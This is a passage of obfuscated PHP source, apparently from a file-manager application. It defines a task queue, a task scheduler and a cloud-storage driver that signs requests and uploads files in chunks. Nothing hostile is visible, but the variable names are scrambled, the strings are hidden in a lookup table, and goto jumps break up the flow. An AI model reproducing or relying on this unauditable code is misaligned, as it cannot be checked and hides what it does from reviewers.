$·ñ÷ûê¼[$™Õ×Ú©[1636]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\x51\165\x65\x75\145\114\x65\x6e\147\164\x68"; const QUEUE_DATA = "\x74\x61\163\153\121\165\x65\165\x65\104\141\164\x61"; const QUEUE_TIME = "\x74\x61\x73\153\121\165\145\165\145\x4c\141\163\x74\x52\165\x6e"; const QUEUE_THREAD = "\x74\141\163\x6b\121\165\x65\165\x65\124\x68\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($úá¬ôß´, $ÊÕê™»“ = array(), $˜ĞŞ«÷Ö = '', $øÖ·Ò„ï = '') { $¡àü…áÔ =& $_SERVER[ìïæ“œî]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($øÖ·Ò„ï && array_find_by_field(self::$listData, $¡àü…áÔ[97], $øÖ·Ò„ï)) { return !0; } if ($øÖ·Ò„ï && array_find_by_field(self::$listDataAdd, $¡àü…áÔ[97], $øÖ·Ò„ï)) { return !0; } self::$listDataAdd[] = array($¡àü…áÔ[341] => $úá¬ôß´, $¡àü…áÔ[1845] => $ÊÕê™»“, $¡àü…áÔ[526] => $˜ĞŞ«÷Ö, $¡àü…áÔ[97] => $øÖ·Ò„ï); return !0; } public static function addSubmit() { $ùê»‰à =& $_SERVER[ìïæ“œî]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ùê»‰à[1846] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ùê»‰à[12], $ùê»‰à[526])), $ùê»‰à[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ßŸÌôßÌ, $ŠŸ»û³¤ = array(), $¡œÆ›àâ = '', $ªöìƒÅú = '') { $Ğ…ãÄ… =& $_SERVER[ìïæ“œî]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ä±Ë¢…Ñ = self::getAll(); if ($ªöìƒÅú && array_find_by_field($ä±Ë¢…Ñ, $Ğ…ãÄ…[97], $ªöìƒÅú)) { return !0; } $ä±Ë¢…Ñ[] = array($Ğ…ãÄ…[341] => $ßŸÌôßÌ, $Ğ…ãÄ…[1845] => $ŠŸ»û³¤, $Ğ…ãÄ…[526] => $¡œÆ›àâ, $Ğ…ãÄ…[97] => $ªöìƒÅú); self::setAll($ä±Ë¢…Ñ); write_log($Ğ…ãÄ…[1846] . $¡œÆ›àâ, $Ğ…ãÄ…[197]); return !0; } public static function run() { $âĞÅ„¡Ù =& $_SERVER[ìïæ“œî]; $ğŸ÷ƒ± = self::getAll(); $Ñ¶È‘ö = array_shift($ğŸ÷ƒ±); if (!$Ñ¶È‘ö) { return !1; } self::setAll($ğŸ÷ƒ±); $¯ú«¹Šé = timeFloat(); $Úı“ÛÏ = $âĞÅ„¡Ù[12]; try { $Úı“ÛÏ = Hook::apply($Ñ¶È‘ö[$âĞÅ„¡Ù[341]], $Ñ¶È‘ö[$âĞÅ„¡Ù[1845]]); } catch (Exception $Ñ³ÒĞæ©) { write_log($Ñ³ÒĞæ©, $âĞÅ„¡Ù[1241]); } $ï¦‘¼—Å = number_format(timeFloat() - $¯ú«¹Šé, 3) . $âĞÅ„¡Ù[1763]; if ($Úı“ÛÏ && is_string($Úı“ÛÏ)) { $ï¦‘¼—Å = $ï¦‘¼—Å . $âĞÅ„¡Ù[1847] . $Úı“ÛÏ; } write_log($âĞÅ„¡Ù[1848] . $Ñ¶È‘ö[$âĞÅ„¡Ù[526]] . $âĞÅ„¡Ù[1849] . $ï¦‘¼—Å, $âĞÅ„¡Ù[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $«Ÿ˜‘Ûà =& $_SERVER[ìïæ“œî]; $·ÒîıÍæ = self::threadCount() + 1; if ($·ÒîıÍæ > 3 || !self::count()) { return; } write_log($«Ÿ˜‘Ûà[1850] . $·ÒîıÍæ, $«Ÿ˜‘Ûà[197]); Cache::set(self::QUEUE_THREAD, $·ÒîıÍæ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($«Ÿ˜‘Ûà[1851], $«Ÿ˜‘Ûà[197]); } public static function getKey($á¡ƒ•õ§, $şÕ¤Ì¿ = "\x69\156\x74") { $–î²ñ’ó =& $_SERVER[ìïæ“œî]; Cache::removeMemory($á¡ƒ•õ§); $ûÁÏÜµ½ = Cache::get($á¡ƒ•õ§); if ($şÕ¤Ì¿ == $–î²ñ’ó[364]) { return $ûÁÏÜµ½ ? intval($ûÁÏÜµ½) : 0; } if ($şÕ¤Ì¿ == $–î²ñ’ó[1852]) { return is_array($ûÁÏÜµ½) ? $ûÁÏÜµ½ : array(); } return $ûÁÏÜµ½; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ìïæ“œî][1852]); } public static function setAll($¥´¢ÇôÙ) { $ª“È²…³ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¥´¢ÇôÙ), $ª“È²…³); Cache::set(self::QUEUE_DATA, $¥´¢ÇôÙ, $ª“È²…³); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ß­¿Ô, $åáŒõúğ = 5.0) { if (!$ß­¿Ô) { return; } $¯áå¾ä = Cache::get($ß­¿Ô); if (!$¯áå¾ä || timeFloat() - floatVal($¯áå¾ä) >= $åáŒõúğ) { Cache::set($ß­¿Ô, timeFloat(), $åáŒõúğ * 10); return !0; } return !1; } public static function timeLimitCall($­Å£óä‡, $––èš„, $ûûÆ„ˆÓ, $ñ‰Óğˆ = 5.0) { $ÂËçÖ =& $_SERVER[ìïæ“œî]; if (!$­Å£óä‡ || !$––èš„) { return; } self::$asyncAdd = !0; $ı­£©ÚÒ = $ÂËçÖ[1853]; $Õ£–ï˜Ò = Cache::get($ı­£©ÚÒ, !0); $¨Ô¼ÙŠÉ = array($ÂËçÖ[1854] => timeFloat(), $ÂËçÖ[1855] => timeFloat(), $ÂËçÖ[341] => $––èš„, $ÂËçÖ[1845] => $ûûÆ„ˆÓ, $ÂËçÖ[206] => $ñ‰Óğˆ); if (is_array($Õ£–ï˜Ò[$­Å£óä‡])) { $¨Ô¼ÙŠÉ[$ÂËçÖ[1855]] = $Õ£–ï˜Ò[$­Å£óä‡][$ÂËçÖ[1855]]; } if (is_array($Õ£–ï˜Ò[$­Å£óä‡])) { if (timeFloat() - $Õ£–ï˜Ò[$­Å£óä‡][$ÂËçÖ[1854]] < $¨Ô¼ÙŠÉ[$ÂËçÖ[206]] * 0.3) { return; } $¨Ô¼ÙŠÉ[$ÂËçÖ[1855]] = $Õ£–ï˜Ò[$­Å£óä‡][$ÂËçÖ[1855]]; } $Õ£–ï˜Ò[$­Å£óä‡] = $¨Ô¼ÙŠÉ; Cache::set($ı­£©ÚÒ, $Õ£–ï˜Ò, 60); Cache::removeMemory($ı­£©ÚÒ); write_log($ÂËçÖ[1856] . $­Å£óä‡ . $ÂËçÖ[74] . $––èš„, $ÂËçÖ[197]); } public static function timeLimitCallLoop() { $ãœ†ş“ =& $_SERVER[ìïæ“œî]; $Á¦ö­¬ = array($ãœ†ş“[1857]); $«Œ°õ˜ = in_array(strtolower(ACTION), $Á¦ö­¬); if (!$«Œ°õ˜ && !self::$asyncAdd) { return; } $ÏÛúÂ¶ = $ãœ†ş“[1853]; $££Ä¤ôì = Cache::get($ÏÛúÂ¶, !0); if (!$££Ä¤ôì || count($££Ä¤ôì) <= 0) { return; } $ÄâË¬±Ì = !1; $ş¹¹†µ¾ = timeFloat(); $„¥¬ó = array(); foreach ($££Ä¤ôì as $ì“ù”ŸÀ => $®¼”Á‹÷) { if ($ş¹¹†µ¾ - $®¼”Á‹÷[$ãœ†ş“[1855]] > $®¼”Á‹÷[$ãœ†ş“[206]]) { $ÄâË¬±Ì = !0; try { Hook::apply($®¼”Á‹÷[$ãœ†ş“[341]], $®¼”Á‹÷[$ãœ†ş“[1845]]); write_log($ãœ†ş“[1858] . $ì“ù”ŸÀ . $ãœ†ş“[74] . $®¼”Á‹÷[$ãœ†ş“[341]] . $ãœ†ş“[1859] . ACTION, $ãœ†ş“[197]); } catch (Exception $¹–§´—) { } continue; } $„¥¬ó[$ì“ù”ŸÀ] = $®¼”Á‹÷; } if (!$ÄâË¬±Ì) { return; } if (!$„¥¬ó) { return Cache::remove($ÏÛúÂ¶); } Cache::set($ÏÛúÂ¶, $„¥¬ó, 60); Cache::removeMemory($ÏÛúÂ¶); } public static function finished($Ë¶ŠØÜö, $ºôšÏşğ) { $§™ìşçÁ =& $_SERVER[ìïæ“œî]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($§™ìşçÁ[341] => $Ë¶ŠØÜö, $§™ìşçÁ[1845] => $ºôšÏşğ); } private static function finishedRun() { $ŸÉŞ”¢° =& $_SERVER[ìïæ“œî]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $õÑÎ¬öÂ) { try { Hook::apply($õÑÎ¬öÂ[$ŸÉŞ”¢°[341]], $õÑÎ¬öÂ[$ŸÉŞ”¢°[1845]]); } catch (Exception $£ì¸”‚ü) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto C®í³í‹È; CÃƒÜ¼èÎò: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\72\x2f\x2f\x76\60\x2e\141\160\151\56\x75\x70\x79\165\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($‘•™µç) { parent::__construct(); $this->_init($‘•™µç); } public function _init($ûíÎçÅ²) { $¬é••ä =& $_SERVER[ìïæ“œî]; foreach ($ûíÎçÅ² as $…åä¬·ª => $ŸÅ†¤õ¿) { if (isset($this->{$…åä¬·ª})) { $this->{$…åä¬·ª} = $ŸÅ†¤õ¿; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¬é••ä[1522] . LNG($¬é••ä[1441])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÜññØ¾÷, $ùä¬ö = "\x47\105\124") { $á˜ñãëË =& $_SERVER[ìïæ“œî]; $˜Ï°æËÔ = gmdate($á˜ñãëË[1470]); $ÄÖÀß”¢ = base64_encode(hash_hmac($á˜ñãëË[1523], "{$ùä¬ö}\46{$ÜññØ¾÷}\x26{$˜Ï°æËÔ}", md5("{$this->userpass}"), !0)); $³ëù¶»Í = array("\x41\x75\164\150\x6f\162\x69\x7a\x61\x74\151\x6f\156\x3a\x55\120\131\x55\x4e\40{$this->username}\72{$ÄÖÀß”¢}", "\x44\x61\164\145\72{$˜Ï°æËÔ}"); return $³ëù¶»Í; } public function ussRequest($¤•ºÄ‘, $ŸãéãßÆ = "\107\x45\x54", $ú†×µ‰ = false, $şÔ˜» = false, $Şš…ğÇ  = false) { $åíƒ¯ïÒ =& $_SERVER[ìïæ“œî]; $¤•ºÄ‘ = trim($¤•ºÄ‘, $åíƒ¯ïÒ[8]); $‡Í¯¶ôë = "\57{$this->bucket}\57{$¤•ºÄ‘}"; $Óù“Ò—Ş = $this->ussHeaders($‡Í¯¶ôë, $ŸãéãßÆ); if ($şÔ˜») { $Óù“Ò—Ş = array_merge($Óù“Ò—Ş, $şÔ˜»); } $³Í¥®ãÁ = url_request($this->endpoint . $‡Í¯¶ôë, $ŸãéãßÆ, $ú†×µ‰, $Óù“Ò—Ş, $Şš…ğÇ ); if (!$³Í¥®ãÁ) { $ªÈœş = LNG($åíƒ¯ïÒ[1524]); $this->writeLog($ªÈœş); return array($åíƒ¯ïÒ[1274] => !1, $åíƒ¯ïÒ[1264] => $ªÈœş); } if (strtolower($ŸãéãßÆ) == $åíƒ¯ïÒ[227] || in_array($³Í¥®ãÁ[$åíƒ¯ïÒ[1274]], array($åíƒ¯ïÒ[274], $åíƒ¯ïÒ[1525]))) { $ú†×µ‰ = $³Í¥®ãÁ[$åíƒ¯ïÒ[1526]]; } else { $ú†×µ‰ = json_decode($³Í¥®ãÁ[$åíƒ¯ïÒ[1264]], !0); if (!$ú†×µ‰) { $ú†×µ‰ = $³Í¥®ãÁ[$åíƒ¯ïÒ[1264]]; } else { if (!$³Í¥®ãÁ[$åíƒ¯ïÒ[799]] && isset($ú†×µ‰[$åíƒ¯ïÒ[1527]])) { $ú†×µ‰ = $ú†×µ‰[$åíƒ¯ïÒ[1527]]; } } } if (!$³Í¥®ãÁ[$åíƒ¯ïÒ[799]]) { $this->writeLog($this->__errorMessage($ú†×µ‰)); } return array($åíƒ¯ïÒ[1274] => $³Í¥®ãÁ[$åíƒ¯ïÒ[799]], $åíƒ¯ïÒ[1264] => $ú†×µ‰); } private function __errorMessage($ŒÖÄàû) { $Ö¤Ù›Îş =& $_SERVER[ìïæ“œî]; if (!$ŒÖÄàû) { return $Ö¤Ù›Îş[12]; } static $ÌÑŠ¦„Ğ = null; if (!$ÌÑŠ¦„Ğ) { $ÌÑŠ¦„Ğ = I18n::getType(); } if ($ÌÑŠ¦„Ğ != $Ö¤Ù›Îş[1480]) { return $ŒÖÄàû; } $ŠÈà“Œ« = array($Ö¤Ù›Îş[1528] => $Ö¤Ù›Îş[1529], $Ö¤Ù›Îş[1530] => $Ö¤Ù›Îş[1531], $Ö¤Ù›Îş[1532] => $Ö¤Ù›Îş[1531], $Ö¤Ù›Îş[1533] => $Ö¤Ù›Îş[1534], $Ö¤Ù›Îş[1535] => $Ö¤Ù›Îş[1536], $Ö¤Ù›Îş[1537] => $Ö¤Ù›Îş[1538], $Ö¤Ù›Îş[1539] => $Ö¤Ù›Îş[1540]); return isset($ŠÈà“Œ«[$ŒÖÄàû]) ? $ŠÈà“Œ«[$ŒÖÄàû] : $ŒÖÄàû; } public function mkfile($Ô¢ªùßö, $Ë ‚Ø› = '', $Íë½òÅÄ = REPEAT_RENAME) { if ($this->setContent($Ô¢ªùßö, $Ë ‚Ø›)) { return $this->getPathOuter($Ô¢ªùßö); } return !1; } public function mkdir($î‰±‡ú, $¬¬™‰ÜÀ = REPEAT_SKIP) { $Ü’³¸¤Š =& $_SERVER[ìïæ“œî]; $¤¸Şèäø = trim($î‰±‡ú, $Ü’³¸¤Š[8]); if ($this->_isFolder($¤¸Şèäø)) { return $this->getPathOuter($¤¸Şèäø); } $åªê»Ş = array($Ü’³¸¤Š[1541]); $Ò‹óŒ Ì = $this->ussRequest($¤¸Şèäø, $Ü’³¸¤Š[257], !1, $åªê»Ş); return $Ò‹óŒ Ì[$Ü’³¸¤Š[1274]] ? $this->getPathOuter($¤¸Şèäø) : !1; } public function copyFile($¬ä±·‰©, $Ôˆáï²) { $Ë¥…ÉĞ× =& $_SERVER[ìïæ“œî]; $ÃÈîŸ¢å = array($Ë¥…ÉĞ×[1542] . "\57{$this->bucket}\57{$¬ä±·‰©}", $Ë¥…ÉĞ×[1543]); $¦âİ•ºî = $this->ussRequest($Ôˆáï², $Ë¥…ÉĞ×[259], !1, $ÃÈîŸ¢å); return $¦âİ•ºî[$Ë¥…ÉĞ×[1274]] ? !0 : $this->getPathOuter($Ôˆáï²); } public function moveFile($Ïì ú¦, $ÏƒËñ¼š) { $ÁÄÇÔ‰Ë =& $_SERVER[ìïæ“œî]; $ÌÅœÌšı = array($ÁÄÇÔ‰Ë[1544] . "\x2f{$this->bucket}\57{$Ïì ú¦}", $ÁÄÇÔ‰Ë[1543]); $À½š¹° = $this->ussRequest($ÏƒËñ¼š, $ÁÄÇÔ‰Ë[259], !1, $ÌÅœÌšı); return $À½š¹°[$ÁÄÇÔ‰Ë[1274]] ? !0 : $this->getPathOuter($ÏƒËñ¼š); } public function delFile($ø–¦…•») { $ “ú°· =& $_SERVER[ìïæ“œî]; $ÕáçÂî = $this->ussRequest($ø–¦…•», $ “ú°·[1545]); return $ÕáçÂî[$ “ú°·[1274]] ? !0 : !1; } public function delFolder($ºÂ¤ÜÃû) { $Ç€ı§ı© =& $_SERVER[ìïæ“œî]; if (!$this->exist($ºÂ¤ÜÃû)) { return !0; } $this->listItemCache = !1; $ô™³¿Á§ = $‚²ÙçÆ = array(); $this->fileList($ºÂ¤ÜÃû, $ô™³¿Á§, $‚²ÙçÆ, !0); $this->listItemCache = !0; foreach ($‚²ÙçÆ as $œÂ¯ÄÑÜ) { $ÒøƒÖµ¾ = $this->ussRequest($œÂ¯ÄÑÜ[$Ç€ı§ı©[32]], $Ç€ı§ı©[1545]); if (!$ÒøƒÖµ¾[$Ç€ı§ı©[1274]]) { return !1; } } foreach ($ô™³¿Á§ as $Ôêä‘‰å) { $ÒøƒÖµ¾ = $this->ussRequest($Ôêä‘‰å, $Ç€ı§ı©[1545]); if (!$ÒøƒÖµ¾[$Ç€ı§ı©[1274]]) { return !1; } } $ÒøƒÖµ¾ = $this->ussRequest($ºÂ¤ÜÃû, $Ç€ı§ı©[1545]); return $ÒøƒÖµ¾[$Ç€ı§ı©[1274]]; } public function rename($øïÎöô, $óİèÅÕå) { if ($this->isFile($øïÎöô)) { $óİèÅÕå = get_path_father($øïÎöô) . $óİèÅÕå; return $this->moveFile($øïÎöô, $óİèÅÕå); } return $this->renameObject($øïÎöô, $óİèÅÕå); } public function fileInfo($ã¿àíåË, $„¬’¾­Ê = false, $ÁáˆŠÛˆ = array()) { $îêãï¿ =& $_SERVER[ìïæ“œî]; $Û»£æ› = array($îêãï¿[32] => $this->pathThis($ã¿àíåË), $îêãï¿[87] => $this->getPathOuter($îêãï¿[8] . $ã¿àíåË), $îêãï¿[33] => $îêãï¿[230], $îêãï¿[79] => isset($ÁáˆŠÛˆ[$îêãï¿[79]]) ? $ÁáˆŠÛˆ[$îêãï¿[79]] : 0, $îêãï¿[169] => $this->ext($ã¿àíåË)); if ($„¬’¾­Ê) { return $Û»£æ›; } $Û»£æ›[$îêãï¿[231]] = $Û»£æ›[$îêãï¿[88]] = 0; $Û»£æ›[$îêãï¿[232]] = $Û»£æ›[$îêãï¿[233]] = !0; if (empty($ÁáˆŠÛˆ)) { $ÁáˆŠÛˆ = $this->objectMeta($ã¿àíåË); if (!$ÁáˆŠÛˆ) { return $Û»£æ›; } } $Û»£æ›[$îêãï¿[231]] = intval($ÁáˆŠÛˆ[$îêãï¿[1546]]); $Û»£æ›[$îêãï¿[88]] = intval($ÁáˆŠÛˆ[$îêãï¿[1547]]); $Û»£æ›[$îêãï¿[79]] = $ÁáˆŠÛˆ[$îêãï¿[79]]; return $Û»£æ›; } public function folderInfo($ö®‰£Âæ, $üÇ…·À³ = false) { $ß¿ş£°£ =& $_SERVER[ìïæ“œî]; $„êÒ³ëà = array($ß¿ş£°£[32] => $this->pathThis($ö®‰£Âæ), $ß¿ş£°£[87] => $this->getPathOuter($ß¿ş£°£[8] . $ö®‰£Âæ), $ß¿ş£°£[33] => $ß¿ş£°£[78]); if ($üÇ…·À³) { return $„êÒ³ëà; } $„êÒ³ëà[$ß¿ş£°£[231]] = $„êÒ³ëà[$ß¿ş£°£[88]] = 0; $„êÒ³ëà[$ß¿ş£°£[232]] = $„êÒ³ëà[$ß¿ş£°£[233]] = !0; if (empty($´êù½îŒ)) { $´êù½îŒ = $this->objectMeta($ö®‰£Âæ); if (!$´êù½îŒ) { return $„êÒ³ëà; } } $„êÒ³ëà[$ß¿ş£°£[231]] = intval($´êù½îŒ[$ß¿ş£°£[1546]]); $„êÒ³ëà[$ß¿ş£°£[88]] = intval($´êù½îŒ[$ß¿ş£°£[1547]]); return $„êÒ³ëà; } private function listObjs($ğçËÃ›Ÿ, $¾ûÖºäñ = 0, $ÁäÍÏŠß = 1000) { $¨Ò”¹ÎÒ =& $_SERVER[ìïæ“œî]; $™ñµÛœé = array($¨Ò”¹ÎÒ[1548], $¨Ò”¹ÎÒ[1549] . $ÁäÍÏŠß); if ($¾ûÖºäñ) { $™ñµÛœé[] = $¨Ò”¹ÎÒ[1550] . $¾ûÖºäñ; } $·éúåè¿ = $this->ussRequest($ğçËÃ›Ÿ, $¨Ò”¹ÎÒ[261], !1, $™ñµÛœé); return !$·éúåè¿[$¨Ò”¹ÎÒ[1274]] ? !1 : $·éúåè¿[$¨Ò”¹ÎÒ[1264]]; } private function fileList($…üš§š«, &$ğÌıˆƒó, &$Ü…Ã ²”, $ÄåÀÄÎú = false) { $ÙãÀ«¡’ =& $_SERVER[ìïæ“œî]; $êÔ—á° = $ÙãÀ«¡’[12]; $Í‘‡õ†û = 1000; $‰ĞÏ•ö = rtrim($…üš§š«, $ÙãÀ«¡’[8]) . $ÙãÀ«¡’[8]; while (!0) { check_abort(); $–×¡®€¬ = $this->listObjs($…üš§š«, $êÔ—á°, $Í‘‡õ†û); if (!$–×¡®€¬) { return !1; } $êÔ—á° = isset($–×¡®€¬[$ÙãÀ«¡’[1551]]) ? $–×¡®€¬[$ÙãÀ«¡’[1551]] : $ÙãÀ«¡’[12]; $¬şşÆå = isset($–×¡®€¬[$ÙãÀ«¡’[1552]]) ? $–×¡®€¬[$ÙãÀ«¡’[1552]] : array(); foreach ($¬şşÆå as $º…ãğÙŒ) { $ó¦şÑé¦ = $º…ãğÙŒ[$ÙãÀ«¡’[33]] == $ÙãÀ«¡’[78] ? !0 : !1; $ş‘˜‡–Ç = ltrim($‰ĞÏ•ö . $º…ãğÙŒ[$ÙãÀ«¡’[32]], $ÙãÀ«¡’[8]) . ($ó¦şÑé¦ ? $ÙãÀ«¡’[8] : $ÙãÀ«¡’[12]); $ç•ê½‹ = array($ÙãÀ«¡’[32] => $ş‘˜‡–Ç, $ÙãÀ«¡’[33] => $ó¦şÑé¦ ? $ÙãÀ«¡’[78] : $ÙãÀ«¡’[230], $ÙãÀ«¡’[79] => $º…ãğÙŒ[$ÙãÀ«¡’[413]], $ÙãÀ«¡’[1547] => $º…ãğÙŒ[$ÙãÀ«¡’[1553]]); $this->cacheMethodInfoSet($ş‘˜‡–Ç, $ó¦şÑé¦, $ç•ê½‹); if ($ó¦şÑé¦) { $ğÌıˆƒó[] = $ş‘˜‡–Ç; if ($ÄåÀÄÎú) { $this->fileList($ş‘˜‡–Ç, $ğÌıˆƒó, $Ü…Ã ²”, $ÄåÀÄÎú); } continue; } $Ü…Ã ²”[] = $ç•ê½‹; } if (count($¬şşÆå) < $Í‘‡õ†û) { break; } } $this->cacheMethodInfoSet($…üš§š«, !0); } public function listPath($ıŠí±Ş÷, $İ¸‘š¢² = false) { $´¾°™â¾ =& $_SERVER[ìïæ“œî]; $ÈÇ“ú…ù = $ÂÓÒåŸÌ = array(); $this->fileList($ıŠí±Ş÷, $ÈÇ“ú…ù, $ÂÓÒåŸÌ); foreach ($ÈÇ“ú…ù as $¢ï‡¢ÙÒ => $É‚¦Ãä¯) { $ÈÇ“ú…ù[$¢ï‡¢ÙÒ] = $this->folderInfo($É‚¦Ãä¯, $İ¸‘š¢²); } foreach ($ÂÓÒåŸÌ as $¢ï‡¢ÙÒ => $É‚¦Ãä¯) { $ÂÓÒåŸÌ[$¢ï‡¢ÙÒ] = $this->fileInfo($É‚¦Ãä¯[$´¾°™â¾[32]], $İ¸‘š¢², $É‚¦Ãä¯); } return array($´¾°™â¾[85] => $ÈÇ“ú…ù, $´¾°™â¾[86] => $ÂÓÒåŸÌ); } public function has($§ŒˆÑ, $÷«ØÃË = false, $¡¦™…¬† = true) { $ö£÷úÌù =& $_SERVER[ìïæ“œî]; $ı‚Ş £ = $ö£÷úÌù[12]; $…÷¥¾ß = 500; $Ü«‡Ñø = 0; $è´·š¦ = 0; $çãÏä¢„ = rtrim($§ŒˆÑ, $ö£÷úÌù[8]) . $ö£÷úÌù[8]; while (!0) { check_abort(); $¼ŒöÉº‰ = $this->listObjs($§ŒˆÑ, $ı‚Ş £, $…÷¥¾ß); if (!$¼ŒöÉº‰) { return !1; } $ı‚Ş £ = isset($¼ŒöÉº‰[$ö£÷úÌù[1551]]) ? $¼ŒöÉº‰[$ö£÷úÌù[1551]] : $ö£÷úÌù[12]; $Ğ¦ú¨ğĞ = isset($¼ŒöÉº‰[$ö£÷úÌù[1552]]) ? $¼ŒöÉº‰[$ö£÷úÌù[1552]] : array(); if (empty($Ğ¦ú¨ğĞ)) { break; } $’é¶Ç¹ = array_filter($Ğ¦ú¨ğĞ, function ($¾§¯Ïòæ) { $ıòÉâÇö =& $_SERVER[ìïæ“œî]; return $¾§¯Ïòæ[$ıòÉâÇö[33]] == $ıòÉâÇö[78]; }); $³µîÍÊô = count($Ğ¦ú¨ğĞ); $’é¶Ç¹ = count($’é¶Ç¹); $©¶Îµõæ = $³µîÍÊô - $’é¶Ç¹; if ($÷«ØÃË) { $è´·š¦ += $’é¶Ç¹; $Ü«‡Ñø += $©¶Îµõæ; if ($³µîÍÊô < $…÷¥¾ß) { break; } continue; } if ($¡¦™…¬†) { if ($©¶Îµõæ) { return !0; } } else { if ($’é¶Ç¹) { return !0; } } if ($³µîÍÊô < $…÷¥¾ß) { break; } } if ($÷«ØÃË) { return array($ö£÷úÌù[239] => $Ü«‡Ñø, $ö£÷úÌù[240] => $è´·š¦); } return !1; } public function listAll($Ñ¤˜ÛĞ—) { $³ß‚úÜ =& $_SERVER[ìïæ“œî]; $¨¾Ë“û¼ = $’ÈâÂÒÒ = array(); $this->fileList($Ñ¤˜ÛĞ—, $¨¾Ë“û¼, $’ÈâÂÒÒ, !0); $ÖÔ¼°ßš = array_to_keyvalue($’ÈâÂÒÒ, $³ß‚úÜ[32]); foreach ($¨¾Ë“û¼ as $ëµ³„¢€) { if (is_string($ëµ³„¢€)) { $ÖÔ¼°ßš[$ëµ³„¢€] = array($³ß‚úÜ[79] => 0); } } return $this->listAllFiles($Ñ¤˜ÛĞ—, $ÖÔ¼°ßš); } public function canRead($İÕÁ¬¿) { return $this->exist($İÕÁ¬¿) ? !0 : !1; } public function canWrite($Ğ¡á³Û) { return $this->exist($Ğ¡á³Û) ? !0 : !1; } public function getContent($æî£ÏÀ) { return $this->fileSubstr($æî£ÏÀ, 0, -1); } public function setContent($“Ç«Úï, $ºè©‡ï = '') { $£Ğ†÷Ú² =& $_SERVER[ìïæ“œî]; if (!$ºè©‡ï) { $Í™¬Üüû = $this->ussRequest($“Ç«Úï, $£Ğ†÷Ú²[257]); return $Í™¬Üüû[$£Ğ†÷Ú²[1274]]; } $İĞş•®É = $this->tempFile($this->pathThis($“Ç«Úï)); file_put_contents($İĞş•®É, $ºè©‡ï); if ($this->upload($“Ç«Úï, $İĞş•®É)) { $this->tempFileRemve($İĞş•®É); return !0; } return !1; } public function fileSubstr($ôÙÛÇÅ£, $î¦ÑíÂş, $â¶õ€Ó‹) { $Ÿ¡Ù‚½ğ =& $_SERVER[ìïæ“œî]; if (!($ùÍ›Õå = $this->link($ôÙÛÇÅ£))) { return !1; } $«šÈ–²¿ = !1; if ($â¶õ€Ó‹ > 0) { $ŞÕç„ëİ = $î¦ÑíÂş + $â¶õ€Ó‹ - 1; $«šÈ–²¿ = array($Ÿ¡Ù‚½ğ[1512] . $î¦ÑíÂş . $Ÿ¡Ù‚½ğ[462] . $ŞÕç„ëİ); } $Ô”ñÈôú = url_request($ùÍ›Õå, $Ÿ¡Ù‚½ğ[261], !1, $«šÈ–²¿); return $Ô”ñÈôú[$Ÿ¡Ù‚½ğ[799]] ? $Ô”ñÈôú[$Ÿ¡Ù‚½ğ[1264]] : !1; } public function upload($¦÷ıíş, $Ò¾ˆÒŒæ, $²±ÓÓÎ² = false, $„ğ…“ŸÔ = REPEAT_REPLACE) { $ıâèò² =& $_SERVER[ìïæ“œî]; $€¥ ®Ú¿ = IO::size($Ò¾ˆÒŒæ); if ($€¥ ®Ú¿ <= 1024 * 1024 * 200) { $’£ÚÛ¥  = array($ıâèò²[1554] . $Ò¾ˆÒŒæ); $÷Á¬‘¤î = $this->ussRequest($¦÷ıíş, $ıâèò²[259], $’£ÚÛ¥ ); return $÷Á¬‘¤î[$ıâèò²[1274]] ? $this->getPathOuter($¦÷ıíş) : !1; } $ı ‡€–Ò = 1024 * 1024 * 10; $êİ‚˜£ú = array($ıâèò²[1555], $ıâèò²[1556] . $€¥ ®Ú¿, $ıâèò²[1557], $ıâèò²[1558] . $ı ‡€–Ò); $÷Á¬‘¤î = $this->ussRequest($¦÷ıíş, $ıâèò²[259], !1, $êİ‚˜£ú); if (!$÷Á¬‘¤î[$ıâèò²[1274]]) { return !1; } $Â—‡Ô²¡ = $÷Á¬‘¤î[$ıâèò²[1264]]; $¶„‡Ç¨Á = 0; $×Å¶Î“Ÿ = $Â—‡Ô²¡[$ıâèò²[1559]]; $™Ÿ¸ÔÒº = fopen($Ò¾ˆÒŒæ, $ıâèò²[1435]); if (!$™Ÿ¸ÔÒº) { return !1; } do { $·şÓ©´Ÿ = $Â—‡Ô²¡[$ıâèò²[1560]]; fseek_64($™Ÿ¸ÔÒº, $¶„‡Ç¨Á); $ûü´šËá = fread($™Ÿ¸ÔÒº, $·şÓ©´Ÿ); $ôÏ†­øö = 0; do { $ôÏ†­øö++; $Â—‡Ô²¡ = $this->uploadPart($¦÷ıíş, $Â—‡Ô²¡, $ûü´šËá); } while (!$Â—‡Ô²¡ 